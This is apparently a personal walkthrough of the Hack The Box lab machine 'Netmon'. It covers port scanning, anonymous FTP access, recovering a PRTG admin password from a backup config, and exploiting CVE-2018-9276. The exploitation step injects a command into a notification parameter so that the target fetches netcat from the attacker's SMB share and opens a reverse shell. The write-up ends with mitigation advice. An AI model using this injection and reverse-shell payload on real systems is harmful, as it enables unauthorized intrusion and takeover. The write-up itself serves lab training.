# Netmon

```
kali@kali:~/htb/Netmon$ sudo nmap -p- -sV -sC 10.129.103.234
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 10:04 EST
Nmap scan report for 10.129.103.234
Host is up (0.031s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 39s, deviation: 0s, median: 38s
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T15:07:05
|_  start_date: 2021-02-25T15:00:58

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.88 seconds
kali@kali:~/htb/Netmon$ 
```

So we have some interesting stuff already. Anonymous ftp login allowed. A webserver on port 80. HTTPAPI on port 5985 and 47001. And a ton of other open ports.

Since there is so many ports, I'm gonna do some more enumeration.

```
kali@kali:~/htb/Netmon$ sudo nmap -p 21,80,135,139,445 --script vuln 10.129.103.234
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-25 10:43 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.103.234
Host is up (0.028s latency).

PORT    STATE SERVICE
21/tcp  open  ftp
|_sslv2-drown: 
80/tcp  open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.103.234
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.103.234:80/
|     Form id: loginform
|     Form action: /public/checklogin.htm
|     
|     Path: http://10.129.103.234:80/public/forgotpassword.htm
|     Form id: loginform
|     Form action: /public/sendpassword.htm
|     
|     Path: http://10.129.103.234:80/downloads.htm
|     Form id: loginform
|     Form action: /public/checklogin.htm
|     
|     Path: http://10.129.103.234:80/public/checklogin.htm
|     Form id: loginform
|     Form action: /public/checklogin.htm
|     
|     Path: http://10.129.103.234:80/home
|     Form id: loginform
|_    Form action: /public/checklogin.htm
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /icons/ecblank.gif: Lotus Domino
|   /icons/ecblank.gif: Lotus Domino
|   /icons/icon_set_up_2701XX_01.gif: 2WIRE 2701HG
|_  /icons/icon_homeportal_2701XX.gif: 2WIRE 2701HG
| http-litespeed-sourcecode-download: 
| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)
| [...]
| [...] Content removed for lenght in writeup.
| [...]
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 545.34 seconds
kali@kali:~/htb/Netmon$ 

```

Ok, so we see that CVE-2010-2333 looks like it works. And we get the source code of the page.

Googling the exploit name reveals an exploit found by TheDefaced Security team, here is a snippet:

```
# Example:                                                                             # 
# Basicly if you had a URL like so http://www.site.com/index.php.                      #
# And you wanted this websites source you could simply add a nullbyte and an extension #
# Like So http://www.site.com/index.php%00.txt                                         #
# Litespeed would then at this point asume the file is a txt file.                     #
#                                                                                      #
# Keep in mind that this vuln is Mime Type Injection... so it works with any type.     #
# Like if you did %00.rar it would asume the index.php was a rar file.                 #
# Theres a numerous ammount of things you could do.                                    #
#                                                                                      #
# As to of why litespeed does this is not confirmed by us just yet.                    #
#                                                                                      #
# I asume it has somthing to do with mimetype handling thus the name of the exploit.   #
# MimeType Injection.                                                                  #
```

I try checking around with this a bit but I can't find anything quickly. So let's move on to ftp:

```
kali@kali:~/htb/Netmon$ ftp 10.129.103.234
Connected to 10.129.103.234.
220 Microsoft FTP Service
Name (10.129.103.234:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
02-25-19  10:49PM       <DIR>          Windows
226 Transfer complete.
ftp> 
```

We get in, and we can even access the user.txt file from here. But it's not the best way to sift through the information. So let's use curlftpfs to do this:

curlftpfs is a filesystem that is used to access ftp hosts.

```
kali@kali:~/htb/Netmon$ sudo mkdir /mnt/ftp
kali@kali:~/htb/Netmon$ sudo curlftpfs anonymous:anonymous@10.129.103.234 /mnt/ftp
root@kali:/mnt/ftp# ls
'$RECYCLE.BIN'   BOOTNXT                   inetpub        PerfLogs     'Program Files'         Recovery                     Users
 bootmgr        'Documents and Settings'   pagefile.sys   ProgramData  'Program Files (x86)'  'System Volume Information'   Windows
root@kali:/mnt/ftp# 
```


I search around for a bit until I discover:

```
root@kali:/mnt/ftp/ProgramData/Paessler/PRTG Network Monitor# ls
'Configuration Auto-Backups'  'Logs (Sensors)'     'Monitoring Database'     'PRTG Configuration.old.bak'  'System Information Database'
'Log Database'                'Logs (System)'      'PRTG Configuration.dat'  'PRTG Graph Data Cache.dat'   'Ticket Database'
'Logs (Debug)'                'Logs (Web Server)'  'PRTG Configuration.old'  'Report PDFs'                 'ToDo Database'
root@kali:/mnt/ftp/ProgramData/Paessler/PRTG Network Monitor# 
```


I check the files and eventually with:

`root@kali:/mnt/ftp/ProgramData/Paessler/PRTG Network Monitor# cat "PRTG Configuration.old.bak" | grep -A 2 "password" | less -S`

I find:

```
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
            </dbpassword>

```


I try it on the webpage, but it fails. So I just try changing the year. And I get in with prtgadmin:PrTg@dmin2019

I get PRTG VersionPRTG Network Monitor 18.1.37.13946 from checking the system status. And I check if there are any exploits:

```
kali@kali:~/htb/Netmon$ searchsploit PRTG
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                      | windows/webapps/46527.sh
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                  | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                   | java/webapps/34108.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The RCE looks promising, all I have to do is use my cookies.

```
kali@kali:~/htb/Netmon$ ./46527.sh -u http://10.129.103.234 -c "_ga=GA1.4.1938792674.1614275825; _gid=GA1.4.24396096.1614275825; OCTOPUS1813713946=ezU5ODVBRkUwLTg4RjYtNDdDQy1BNkJDLTA3RDQ1QzgzNDYzRH0%3D; _gat=1"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                        

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
kali@kali:~/htb/Netmon$ 
```

Ok, so we know the exploit works.

So I google about the exploit a bit and discover it is used through the notification tab in the admin panel.

```
if ($Args.Count -eq 0) {

   #No Arguments. Filename must be specified.

   exit 1;
  }elseif ($Args.Count -eq 1){

   $path = split-path $Args[0];

   if (Test-Path $Path)
   {
     $Text=Get-Date;
     $Text | out-File $Args[0];
     exit 0;
   }
}
```

We can see that in the line `$Text | out-File $Args[0];`

The argument we give is not sanitized. 

out-File sends output to a file. So we send the output to a file, and then we can choose to continue the command by adding a ; after, which says that command is over. After this we can add our own commands.


I set the Program file to `Demo exe notification - outfile.ps1` and add this as the parameter:

`test.txt;\\10.10.14.60\smb\nc.exe -e cmd 10.10.14.60 1337`

We give the valid input with test.txt, and then run another command after that. This command just uses netcat from my smbserver to connect back to my listener.

I set up the smbserver to run the netcat binary:

```
kali@kali:~/htb/Netmon$ sudo smbserver.py smb .
Impacket v0.9.22.dev1+20200819.170651.b5fa089b - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

And then test the notification:

```
kali@kali:~/htb/Netmon$ sudo rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.126 49814
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


## Comparing myself to the official writeup:



## How to stop this exploit:
Giving an anonymous user that much information with ftp is asking for trouble.
If you really need the anonymous access make sure it's limited to what is strictly needed.
Even without the straight passwords find in the files. The password is weak. It's a slightly modified default password. It could be cracked with some password generators.

Another good advice is to make sure you understand all the modules and parts of a system you are installing and using. This may have alerted the admin of the demo script.
Which they would have seen was unsanitized. They could then either fix it manually, remove it, or notify the provider. 

That being said, the provider was notified of the exploit, and the exploit does not exist in the latest patch.
